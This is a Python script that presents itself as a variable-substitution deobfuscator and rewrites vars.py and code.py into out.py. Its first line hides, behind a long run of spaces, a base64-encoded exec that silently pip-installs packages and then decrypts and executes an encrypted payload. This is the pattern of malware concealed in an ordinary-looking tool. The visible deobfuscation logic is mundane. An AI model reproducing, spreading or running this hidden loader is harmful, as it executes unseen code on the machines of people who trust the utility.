import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ2Z1N0RRVXJaY014aE9nNUpPTnBZMGlJQmFuV3NLYnItRkJPdGpYanJNYjA9JykuZGVjcnlwdChiJ2dBQUFBQUJtbm13MFlPMllod2ZrdkRsazUzVjQwZmxKZFVDYzEteU4yeUlxS293N0J4TWRBaGJ1amdmQWVZQW8tYUdMSUR0R1hXYjFZSm9TOHZQX3hmek9jdjYwOG9aN082RkJVR18zMHE0TVR5R09iZGduUWs0U3gxS1lvTnFYdXVHV1liTWttWWlWYzZrdWxqMlNmY3d1UjA3Q3kyblMtWURhWGIxWGZLdnBfdnhZYmYwLUNMX3ZrMnMtb2ZXVjZiVG1TdXVkajdreTk5Qm9hdlAtVnk0Zkd1RzFWaHp2NElyM1NlSTh2VGJNRVR2b3gxSWluZ009Jykp').decode())
import binascii
import os
# by Unleqitq
def deobf(line: str) -> str:
	name0, val0 = line.split("=")
	index = name0.index("[")
	name = eval(name0[index+1:-1])
	try:
		val = eval(val0)
		if (type(val)==str):
			return name+"='"+val.replace("\\", "\\\\").replace("'", "\\'").replace("\n","\\n")+"'"
		if (type(val)==int or type(val) == float or type(val) == bool):
			return name+"="+str(val)
	except:pass
	return name+"="+val0
variables = {}
variableNames = []
lines = []
with open("vars.py") as file:
	lines = file.read().split("\n")

try:os.remove("vars.py")
except:pass

with open("vars.py", "a") as file:
	for line in lines:
		try:
			file.write(deobf(line)+"\n")
		except:
			file.write(line+"\n")

with open("vars.py") as file:
    lines = file.read().split("\n")
    for line in lines:
        try:
            name, val = line.split("=", 1)
            variables[name] = val
            variableNames.append(name)
        except:pass

variableNames.sort(key=len, reverse=True)

with open("code.py") as file:
    code = file.read()

for name in variableNames:
    code = code.replace(name, variables[name])

with open("out.py", 'w') as file:
    file.write(code)
print('nyvnek')